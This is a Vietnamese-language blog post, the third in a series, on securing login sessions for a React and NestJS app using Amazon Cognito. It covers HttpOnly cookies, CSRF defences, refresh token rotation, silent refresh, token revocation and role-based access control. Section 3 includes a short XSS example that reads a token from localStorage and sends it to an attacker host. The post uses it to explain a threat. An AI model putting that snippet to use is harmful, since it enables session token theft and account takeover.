---
title: "Quản lý phiên đăng nhập an toàn: HttpOnly Cookies, Refresh Token và Phân quyền RBAC – Phần 3"
date: 2026-08-13
weight: 3
chapter: false
pre: " <b> 3.3. </b> "
---

## 1. Giới thiệu (Introduction)

Trong ứng dụng web hiện đại, việc xác thực thành công thông tin đăng nhập của người dùng mới chỉ là bước khởi đầu. Một hệ thống an toàn cần giải quyết trọn vẹn ba bài toán cốt lõi:

1. **Xác thực (Authentication):** "Người dùng này là ai?"
2. **Quản lý phiên đăng nhập (Session Management):** "Làm thế nào để duy trì danh tính người dùng một cách an toàn theo thời gian?"
3. **Phân quyền (Authorization):** "Người dùng này có quyền thực hiện những thao tác gì trên tài nguyên hệ thống?"

Trong [Phần 1](../3.1-blog1/), chúng ta đã tìm hiểu lý do tại sao ứng dụng **Startups Blogs** lựa chọn kiến trúc xác thực qua trung gian Backend (Backend-Mediated Authentication) để bảo vệ `COGNITO_CLIENT_SECRET`. Trong [Phần 2](../3.2-blog2/), chúng ta đã đi sâu vào quy trình tính toán `SecretHash` và thẩm định chữ ký số RSA của JWT bằng thư viện `aws-jwt-verify` kết hợp tập khóa công khai JWKS.

Tiếp nối hai phần trước, bài viết **Phần 3** sẽ tập trung phân tích toàn diện chiến lược **Quản lý phiên đăng nhập an toàn**, kỹ thuật **Làm mới Token tự động (Silent Refresh)**, quy trình **Đăng xuất & Thu hồi Token**, kết hợp với mô hình **Phân quyền dựa trên Vai trò (RBAC - Role-Based Access Control)** từ giao diện React 19 Frontend đến máy chủ NestJS Backend và cơ sở dữ liệu PostgreSQL.

> 💡 **Lưu ý về trạng thái triển khai**: Trong phiên bản hiện tại của dự án Startups Blogs, hệ thống sử dụng phương thức lưu trữ Bearer Token phía Client kết hợp với HTTP Header `Authorization: Bearer <accessToken>`. Bài viết này trình bày phân tích chuyên sâu về kiến trúc hiện tại, đồng thời đề xuất **Kiến trúc Quản lý Phiên Nâng cấp (Hardened Session Architecture)** dựa trên HttpOnly Cookies và Refresh Token Rotation cho các phiên bản phát triển tiếp theo.

---

## 2. Tại sao Quản lý Phiên Đăng nhập lại quan trọng?

Rất nhiều nhà phát triển lầm tưởng rằng chỉ cần nhận được mã JWT (JSON Web Token) sau khi đăng nhập là bài toán bảo mật đã hoàn tất. Tuy nhiên, nếu không có chiến lược quản lý phiên đăng nhập đúng đắn, hệ thống sẽ đối mặt với các nguy cơ nghiêm trọng:

```text
Đăng nhập (Login)
  ↓
Xác thực danh tính (Identity Verified)
  ↓
Thiết lập phiên đăng nhập (Session Established)
  ↓
Sử dụng Access Token truy cập API (Access Token Used)
  ↓
Access Token hết hạn (Token Expired)
  ↓
Làm mới Token / Đăng nhập lại (Refresh / Re-authentication)
  ↓
Đăng xuất / Thu hồi quyền (Logout / Revocation)
```

Nếu Access Token có thời hạn quá dài (ví dụ: 30 ngày), khi token bị lộ, kẻ tấn công có thể mạo danh người dùng trong suốt khoảng thời gian đó mà hệ thống không thể ngăn chặn. Ngược lại, nếu Access Token có thời hạn quá ngắn (ví dụ: 15 phút) mà không có cơ chế tự động làm mới, trải nghiệm người dùng (UX) sẽ bị gián đoạn liên tục do bị văng khỏi ứng dụng.

---

## 3. Mối nguy cơ khi Lưu trữ Token trong `localStorage`

Phương pháp phổ biến nhưng tiềm ẩn nhiều rủi ro trong các ứng dụng Single Page Application (SPA) là lưu trữ JWT trực tiếp vào kho lưu trữ của trình duyệt:

```javascript
// Lưu trữ Token vào localStorage
localStorage.setItem('token', accessToken);
```

### Tại sao `localStorage` tiềm ẩn rủi ro bảo mật?
`localStorage` có đặc tính truy cập mở đối với mọi mã JavaScript chạy trong cùng một Origin (tên miền). Nếu ứng dụng gặp phải lỗ hổng **Cross-Site Scripting (XSS)** — xuất phát từ một mã script độc hại bị chèn qua bài viết, mã phụ thuộc npm bị nhiễm mã độc, hoặc đoạn mã quảng cáo bên thứ ba — kẻ tấn công có thể dễ dàng đọc toàn bộ dữ liệu trong `localStorage`:

```javascript
// Mã độc XSS trích xuất Token từ localStorage
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal', { method: 'POST', body: stolenToken });
```

> ⚠️ **Làm rõ bản chất bảo mật:** Lưu bản thân token trong `localStorage` không tạo ra lỗ hổng XSS. Bản chất lỗ hổng XSS xuất phát từ việc xử lý dữ liệu đầu vào/đầu ra không an toàn trên giao diện. Tuy nhiên, `localStorage` làm **tăng mức độ thiệt hại (Impact)** của lỗ hổng XSS, vì token bị lộ hoàn toàn dưới dạng văn bản thuần (plain text) cho JavaScript.

Đặc biệt, nếu cả **Refresh Token** (mã có thời hạn dài) cũng bị lưu trong `localStorage`, kẻ tấn công có thể liên tục cấp lại các Access Token mới để chiếm quyền điều khiển tài khoản dài hạn.

---

## 4. HttpOnly Cookies: Chiến lược Gia cố An toàn cho Session

Để giảm thiểu nguy cơ bị trích xuất token qua XSS, giải pháp kiến trúc nâng cấp được đề xuất là chuyển giao việc quản lý token cho kho lưu trữ Cookie của trình duyệt được cấu hình với các cờ bảo mật nghiêm ngặt:

```typescript
// Ví dụ cấu hình Cookie an toàn phía NestJS Backend
response.cookie('access_token', accessToken, {
  httpOnly: true, // Ngăn chặn hoàn toàn JavaScript truy cập qua document.cookie
  secure: true,   // Chỉ truyền tải Cookie qua kết nối mã hóa HTTPS
  sameSite: 'lax',// Giảm thiểu nguy cơ tấn công Cross-Site Request Forgery (CSRF)
  path: '/',
  maxAge: 15 * 60 * 1000, // Thời gian sống 15 phút
});
```

### Phân tích các cờ bảo mật quan trọng:

1. **`HttpOnly`:** Cờ quan trọng nhất. Trình duyệt sẽ ngăn chặn tuyệt đối mã JavaScript (bao gồm cả `document.cookie` hay các thư viện client) đọc hoặc ghi dữ liệu trong Cookie này. Dù ứng dụng bị dính lỗ hổng XSS, kẻ tấn công cũng **không thể trích xuất trực tiếp chuỗi token**.
2. **`Secure`:** Đảm bảo Cookie chỉ được gửi qua các kết nối được mã hóa SSL/TLS (HTTPS), ngăn chặn việc đánh chặn token trên các mạng Wi-Fi công cộng (Man-in-the-Middle attacks).
3. **`SameSite` (Strict / Lax / None):** Kiểm soát việc trình duyệt có tự động gửi Cookie kèm theo các yêu cầu xuất phát từ các tên miền khác (Cross-Site) hay không. Trong kiến trúc ứng dụng web thông thường, `Lax` hoặc `Strict` giúp ngăn chặn phần lớn các cuộc tấn công CSRF.
4. **Signed Cookie (Cookie được ký số):** Backend ký một chuỗi băm HMAC vào giá trị Cookie để phát hiện và từ chối các Cookie bị sửa đổi trái phép ở phía Client.

> 🛡️ **Lưu ý quan trọng về XSS:** HttpOnly Cookie **không triệt tiêu hoàn toàn lỗ hổng XSS**. Nếu trang web bị XSS, mã độc vẫn có thể thực thi các request HTTP giả mạo từ chính trình duyệt của nạn nhân (vì trình duyệt tự động đính kèm Cookie). Tuy nhiên, HttpOnly Cookie ngăn chặn kẻ tấn công **lấy cắp token mang đi nơi khác** để đăng nhập từ máy tính cá nhân của chúng.

---

## 5. HttpOnly Cookies và Nguy cơ Cross-Site Request Forgery (CSRF)

Khi chuyển từ cơ chế Bearer Token sang Cookie, mô hình đe dọa (Threat Model) của ứng dụng có sự thay đổi. Vì trình duyệt sẽ **tự động đính kèm Cookie** trong các yêu cầu HTTP gửi tới tên miền Backend, ứng dụng đối mặt với nguy cơ tấn công **CSRF (Cross-Site Request Forgery)**.

### Chiến lược phòng vệ CSRF toàn diện:
- **Cấu hình `SameSite=Lax` hoặc `Strict`:** Ngăn chặn trình duyệt gửi Cookie khi người dùng nhấn vào các liên kết độc hại từ trang web bên ngoài.
- **CSRF Anti-Forgery Tokens (Double Submit Cookie):** Sử dụng một mã token ngẫu nhiên không nằm trong Cookie, yêu cầu Frontend đính kèm vào Custom HTTP Header (ví dụ: `X-CSRF-Token`) cho các request làm thay đổi dữ liệu (`POST`, `PUT`, `DELETE`).
- **Kiểm tra Header `Origin` và `Referer`:** NestJS Backend thẩm định chặt chẽ domain gửi request để từ chối các yêu cầu từ các domain không nằm trong danh sách trắng (White-list).
- **Cấu hình CORS nghiêm ngặt:** Chỉ cho phép domain của Frontend gửi request có đính kèm chứng thư (`credentials: true`).

---

## 6. Chiến lược Phối hợp Access Token và Refresh Token

Một mô hình quản lý phiên an toàn phải cân bằng giữa **Tính an ninh (Security)** và **Trải nghiệm người dùng (User Experience)**.

```text
Access Token
- Thời hạn ngắn (Short-lived: 15 - 60 phút)
- Dùng để ủy quyền các yêu cầu API hàng ngày
- Giới hạn thiệt hại nếu bị rò rỉ

Refresh Token
- Thời hạn dài (Long-lived: 7 - 30 ngày)
- Chỉ dùng để xin cấp mới Access Token
- Lưu trữ với cấp độ bảo mật cao nhất
```

```text
Người dùng đăng nhập thành công
          ↓
Backend trả về Access Token (15m) & Refresh Token (7d)
          ↓
Access Token hết hạn (Hệ thống trả về HTTP 401 Unauthorized)
          ↓
Client gửi Refresh Token tới API /auth/refresh
          ↓
Backend thẩm định Refresh Token với Amazon Cognito
          ↓
Cấp bộ Access Token mới -> Tiếp tục phiên làm việc mượt mà
```

---

## 7. Cơ chế Tự động Làm mới Phiên Đăng nhập (Silent Refresh)

Nếu không có cơ chế tự động làm mới, người dùng đang soạn thảo bài viết hoặc điền thông tin gọi vốn sẽ bị ngắt kết nối đột ngột khi Access Token hết hạn.

Để khắc phục, Frontend React 19 triển khai cơ chế **Silent Refresh** thông qua **Axios Interceptors**:

```typescript
// Cấu hình Axios Response Interceptor xử lý tự động Refresh Token
import axios from 'axios';

const api = axios.create({ baseURL: '/api' });

let isRefreshing = false;
let failedQueue: Array<{ resolve: (token: string) => void; reject: (err: unknown) => void }> = [];

const processQueue = (error: unknown, token: string | null = null) => {
  failedQueue.forEach((prom) => {
    if (error) prom.reject(error);
    else prom.resolve(token!);
  });
  failedQueue = [];
};

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Phát hiện lỗi 401 và chưa từng thử refresh
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Nếu đang có request refresh chạy, xếp hàng các request đến sau
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then((token) => {
          originalRequest.headers['Authorization'] = `Bearer ${token}`;
          return api(originalRequest);
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Gọi API làm mới phiên
        const { data } = await axios.post('/api/auth/refresh');
        const newAccessToken = data.accessToken;
        
        localStorage.setItem('token', newAccessToken);
        api.defaults.headers.common['Authorization'] = `Bearer ${newAccessToken}`;
        originalRequest.headers['Authorization'] = `Bearer ${newAccessToken}`;
        
        processQueue(null, newAccessToken);
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        // Làm mới thất bại -> Chuyển hướng người dùng về trang Đăng nhập
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

### Các điểm kỹ thuật cần lưu ý:
1. **Hàng đợi Request (Request Queue):** Tránh việc gửi đồng thời hàng chục request refresh khi có nhiều API cùng trả về lỗi 401 một lúc.
2. **Cờ chống lặp vô hạn (`_retry` flag):** Đảm bảo nếu API refresh cũng thất bại, hệ thống không rơi vào vòng lặp gọi API liên tục.
3. **Chuyển hướng an toàn:** Chỉ điều hướng người dùng về trang đăng nhập khi quá trình làm mới token thực sự thất bại hoặc phiên làm việc đã hết hạn hoàn toàn.

---

## 8. Cơ chế Xoay vòng Refresh Token (Refresh Token Rotation)

Để nâng cao hơn nữa cấp độ bảo mật, kiến trúc nâng cấp đề xuất áp dụng **Refresh Token Rotation**. 

Mỗi khi Refresh Token được sử dụng để lấy Access Token mới, Backend sẽ đồng thời **hủy bỏ Refresh Token cũ** và cấp một **Refresh Token mới tinh**:

```text
Refresh Token A (Sử dụng lần 1)
          ↓
Gọi API /auth/refresh
          ↓
Thu hồi Refresh Token A -> Trả về Access Token B + Refresh Token B
          ↓
Nếu Kẻ tấn công cố tình sử dụng lại Refresh Token A đã bị hủy
          ↓
Hệ thống phát hiện dấu hiệu xâm nhập (Reuse Detection)
          ↓
Thu hồi toàn bộ chuỗi phiên đăng nhập của người dùng
```

Lợi ích lớn nhất của cơ chế này là giúp phát hiện ngay lập tức trường hợp Refresh Token bị kẻ xấu đánh cắp và tái sử dụng.

---

## 9. Đăng xuất: Không chỉ là Xóa State phía Client

Một quy trình đăng xuất (Logout) an toàn không chỉ đơn thuần là xóa token trong `localStorage` hay xóa Cookie trên trình duyệt. 

Nếu chỉ xóa ở phía Client, Access Token và Refresh Token vẫn giữ nguyên giá trị hợp lệ trên Đám mây Amazon Cognito cho đến khi tự hết hạn.

```text
Đăng xuất phía Client (Client-Side Logout)
- Xóa token trong localStorage / Cookie phía Trình duyệt
- Xóa trạng thái đăng nhập trong Zustand Store

Đăng xuất phía Server / IdP (Server-Side / Identity Provider Logout)
- Gọi AWS SDK Cognito API: RevokeToken hoặc GlobalSignOut
- Vô hiệu hóa toàn bộ Refresh Token của người dùng trên AWS Cloud
```

Trong NestJS Backend, ứng dụng có thể tích hợp dịch vụ `CognitoIdentityProviderClient` để thu hồi token:

- **`RevokeTokenCommand`:** Vô hiệu hóa chính xác Refresh Token của phiên hiện tại.
- **`GlobalSignOutCommand`:** Đăng xuất người dùng khỏi **tất cả các thiết bị** (máy tính, điện thoại, tablet) bằng cách vô hiệu hóa toàn bộ token đã cấp cho `username` đó.

---

## 10. Phân quyền Dựa trên Vai trò (RBAC - Role-Based Access Control)

Sau khi xác thực danh tính và duy trì phiên làm việc thành công, hệ thống cần tiến hành **Phân quyền (Authorization)**.

Trong ứng dụng **Startups Blogs**, người dùng được phân chia theo các vai trò hệ thống (System Roles) được định nghĩa trong Prisma Schema:

```prisma
// Extract từ backend/prisma/schema.prisma
enum Role {
  USER
  ADMIN
  MODERATOR
}
```

### Phân biệt Vai trò Hệ thống (System Role) và Quyền Sở hữu Tài nguyên (Resource Ownership):

```text
Vai trò Hệ thống (System Role: USER, ADMIN, MODERATOR)
- Quy định thẩm quyền quản trị chung (Duyệt doanh nghiệp, duyệt bài viết, khóa tài khoản).

Quyền Sở hữu Tài nguyên (Resource Ownership: ownerId == user.id)
- Một người dùng có vai trò USER có thể sở hữu một hoặc nhiều Doanh nghiệp (Business) thông qua trường ownerId.
- USER chỉ có quyền chỉnh sửa/xóa Doanh nghiệp do chính mình sở hữu.
```

Sự kết hợp giữa **System Role** và **Resource Ownership** tạo nên mô hình phân quyền hai tầng chặt chẽ.

---

## 11. Bảo vệ Route phía Frontend (ProtectedRoute)

Trong ứng dụng React 19 Frontend, các đường dẫn nhạy cảm được bọc bởi Component `ProtectedRoute` nhằm tối ưu hóa trải nghiệm người dùng:

```tsx
// Component ProtectedRoute phía React Frontend
import { Navigate, Outlet } from 'react-router-dom';
import { useAuthStore } from '@/stores/authStore';

interface ProtectedRouteProps {
  allowedRoles?: Array<'USER' | 'ADMIN' | 'MODERATOR'>;
}

export const ProtectedRoute = ({ allowedRoles }: ProtectedRouteProps) => {
  const { user, isAuthenticated } = useAuthStore();

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  if (allowedRoles && user && !allowedRoles.includes(user.role)) {
    return <Navigate to="/unauthorized" replace />;
  }

  return <Outlet />;
};
```

> ⚠️ **Quy tắc vàng về Bảo mật:** Bảo vệ Route phía Frontend chỉ mang tính chất **hướng dẫn giao diện và trải nghiệm người dùng (UX)**. Nó **không phải là ranh giới bảo mật (Security Boundary)**. Kẻ tấn công hoàn toàn có thể bỏ qua giao diện React và gửi HTTP request trực tiếp tới Backend. Do đó, mọi kiểm tra phân quyền **bắt buộc phải được thực thi lại phía NestJS Backend**.

---

## 12. Phân quyền và Thẩm định phía Backend

Phía NestJS Backend, mỗi request tới các API bảo vệ phải đi qua đường ống thẩm định đa tầng:

```text
Client Request
      ↓
JwtAuthGuard (Thẩm định chữ ký RSA JWT qua aws-jwt-verify & nạp user)
      ↓
RolesGuard (Thẩm định vai trò hệ thống: @Roles('ADMIN', 'MODERATOR'))
      ↓
Business Service (Kiểm tra quyền sở hữu tài nguyên: business.ownerId === user.userId)
      ↓
Prisma ORM & PostgreSQL (Thực thi câu lệnh dữ liệu)
      ↓
HTTP Response
```

### Minh họa mã nguồn NestJS RolesGuard:

```typescript
// Extract từ backend/src/auth/guards/roles.guard.ts
@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<Role[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);
    if (!requiredRoles) return true;

    const { user } = context.switchToHttp().getRequest<AuthenticatedRequest>();
    return requiredRoles.some((role) => user?.role === role);
  }
}
```

### Kiểm tra quyền sở hữu tại Service Layer:

```typescript
// Extract từ backend/src/businesses/businesses.service.ts
async update(id: string, updateDto: UpdateBusinessDto, ownerId: string) {
  const business = await this.prisma.business.findUnique({ where: { id } });
  if (!business) throw new NotFoundException('Business not found');
  
  // Kiểm tra quyền sở hữu chính xác
  if (business.ownerId !== ownerId) {
    throw new ForbiddenException('You do not have permission to update this business');
  }

  return this.prisma.business.update({ where: { id }, data: updateDto });
}
```

---

## 13. Kiến trúc Quản lý Phiên Đăng nhập của Startups Blogs

Dưới đây là sơ đồ tổng quan mô hình quản lý phiên đăng nhập an toàn kết hợp giữa xác thực Amazon Cognito, xử lý phiên và phân quyền hai tầng:

![Kiến trúc đề xuất quản lý phiên đăng nhập và RBAC](/images/blogs/blog3-proposed-session-rbac-architecture.png)

*Hình 1. Kiến trúc đề xuất quản lý phiên đăng nhập an toàn với HttpOnly Cookies, Silent Refresh, Amazon Cognito và RBAC.*

> **Lưu ý:** Đây là kiến trúc quản lý phiên nâng cấp được đề xuất cho Startups Blogs. Phiên bản hiện tại của hệ thống vẫn sử dụng Access Token phía Client kết hợp với `Authorization: Bearer <accessToken>`.

---

## 14. Danh mục Kiểm tra An toàn Bảo mật (Security Checklist)

Khi triển khai hệ thống xác thực và quản lý phiên trong thực tế, nhà phát triển cần rà soát theo bảng kiểm duyệt sau:

- [x] **HTTPS Mandatory:** Ép buộc truyền tải qua HTTPS cho toàn bộ ứng dụng.
- [x] **No Raw Tokens in JS Storage:** Không lưu trữ Refresh Token dài hạn trong `localStorage`.
- [x] **HttpOnly & Secure Cookies:** Thiết lập cờ `HttpOnly`, `Secure`, `SameSite` cho Cookie chứa thông tin phiên.
- [x] **CSRF Protection:** Triển khai cơ chế phòng chống CSRF (SameSite, Anti-CSRF Token, Origin Check).
- [x] **RSA JWT Verification:** Thẩm định chữ ký số RSA với JWKS bằng `aws-jwt-verify` thay vì `jwt.decode()`.
- [x] **Short-lived Access Tokens:** Cấu hình Access Token thời hạn ngắn (15 - 60 phút).
- [x] **Silent Refresh:** Triển khai cơ chế làm mới token tự động ở Frontend với Axios Interceptors.
- [x] **Rate Limiting:** Áp dụng `@nestjs/throttler` giới hạn số lượng request đến các endpoint đăng nhập/refresh.
- [x] **Backend RBAC Enforcement:** Đảm bảo 100% API nhạy cảm được bảo vệ bởi `JwtAuthGuard` và `RolesGuard`.
- [x] **Resource Ownership Check:** Kiểm tra `ownerId` tại Service layer trước khi chỉnh sửa/xóa dữ liệu.
- [x] **Server-side Revocation:** Đăng xuất triệt để qua `RevokeToken` hoặc `GlobalSignOut` trên Amazon Cognito.

---

## 15. So sánh Kiến trúc Hiện tại và Kiến trúc Nâng cấp Đề xuất

| Tiêu chí | Kiến trúc Hiện tại (Current) | Kiến trúc Nâng cấp Đề xuất (Proposed) |
| --- | --- | --- |
| **Lưu trữ Token** | `localStorage` + Header `Authorization: Bearer` | `HttpOnly` + `Secure` + `SameSite` Cookies |
| **Thẩm định JWT** | Backend `aws-jwt-verify` kiểm tra chữ ký RSA | Backend `aws-jwt-verify` kiểm tra chữ ký RSA |
| **Nguy cơ rò rỉ qua XSS** | Mức độ ảnh hưởng cao nếu bị XSS (Token đọc được) | Mức độ ảnh hưởng thấp (JavaScript không đọc được Cookie) |
| **Phòng chống CSRF** | Không bị ảnh hưởng nhiều bởi CSRF truyền thống | Triển khai cờ `SameSite` và Anti-CSRF Header |
| **Làm mới Token** | Client quản lý thủ công qua SDK/Axios | Backend chủ động xử lý Silent Refresh với HttpOnly Cookie |
| **Phân quyền hệ thống** | `JwtAuthGuard` + `RolesGuard` + Owner Check | `JwtAuthGuard` + `RolesGuard` + Owner Check |
| **Đăng xuất** | Xóa Token ở Client State | Thu hồi Token phía Server qua Cognito `RevokeToken` |

---

## 16. Kết luận

Quản lý phiên đăng nhập và phân quyền là mảnh ghép cuối cùng hoàn thiện bức tranh an toàn thông tin cho ứng dụng web doanh nghiệp. Một kiến trúc bảo mật bền vững đòi hỏi sự kết hợp nhịp nhàng giữa ba tầng:

$$\text{Bảo mật Hệ thống} = \text{Xác thực (Cognito)} + \text{Quản lý Phiên (HttpOnly/Refresh)} + \text{Phân quyền (RBAC/Ownership)}$$

- **Amazon Cognito** giải quyết triệt để bài toán lưu trữ và xác thực mật khẩu Cloud-Native.
- **HttpOnly Cookies & Silent Refresh** bảo vệ token trước nguy cơ XSS và mang lại trải nghiệm người dùng mượt mà.
- **NestJS Guards & Ownership Check** đảm bảo dữ liệu doanh nghiệp trong PostgreSQL chỉ được truy cập bởi đúng người, đúng vai trò.

Nghiên cứu và triển khai thành công mô hình này trên ứng dụng **Startups Blogs** mang lại bài học thực tiễn giá trị về tư duy thiết kế hệ thống phân tán, bảo mật đám mây và phát triển phần mềm chuẩn Enterprise.

---

### Điểm chính cần nhớ

1. **Quản lý phiên đăng nhập sau xác thực:** Đăng nhập thành công chỉ là bước đầu; việc duy trì phiên an toàn qua Refresh Token và vô hiệu hóa token khi đăng xuất đóng vai trò quyết định.
2. **Rủi ro `localStorage` và giải pháp HttpOnly Cookie:** Lưu trữ token trong `localStorage` gia tăng mức độ thiệt hại khi dính XSS; HttpOnly Cookie giúp ngăn chặn việc trích xuất token trực tiếp từ JavaScript.
3. **Silent Refresh & Interceptors:** Tự động làm mới Access Token bằng Axios Interceptors giúp trải nghiệm người dùng không bị gián đoạn khi token hết hạn ngắn hạn.
4. **Phân quyền RBAC & Kiểm tra Ownership:** Kết hợp `JwtAuthGuard`, `RolesGuard` và kiểm tra quyền sở hữu tài nguyên (`ownerId`) tại Service layer bảo đảm an toàn dữ liệu trên PostgreSQL.

---

### Loạt bài bảo mật xác thực

- [Phần 1: Tại sao không nên gọi trực tiếp API xác thực từ Frontend? – Amazon Cognito với React và NestJS](../3.1-blog1/)
- [Phần 2: Bảo mật xác thực Cognito: SecretHash và thẩm định chữ ký JWT – Phần 2](../3.2-blog2/)
- **Phần 3: Quản lý phiên đăng nhập an toàn: HttpOnly Cookies, Refresh Token và Phân quyền RBAC – Phần 3**

---

### Bài viết gốc

[Bài viết trên Facebook](https://www.facebook.com/photo/?fbid=1060772963325290&set=gm.2243690619729231&idorvanity=660548818043427)